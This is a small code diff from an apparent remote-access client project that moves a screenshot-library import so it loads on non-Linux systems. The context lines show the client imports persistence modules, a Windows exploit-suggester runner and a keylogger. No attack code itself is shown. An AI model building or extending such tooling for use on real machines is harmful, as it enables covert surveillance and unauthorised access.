@@ -30,10 +30,11 @@ if platforms.OS == platforms.LINUX:
 if platforms.OS in [platforms.DARWIN, platforms.LINUX]:
     from src.client.persistence.unix import Unix as Persistence
 else:
-    import pyscreeze
-
     from src.client.persistence.windows import Windows as Persistence
     from wes import main as run_wesng
+
+if platforms.OS != platforms.LINUX:
+    import pyscreeze
 
 from src.definitions.commands import *
 from src.client.keylogger import Keylogger
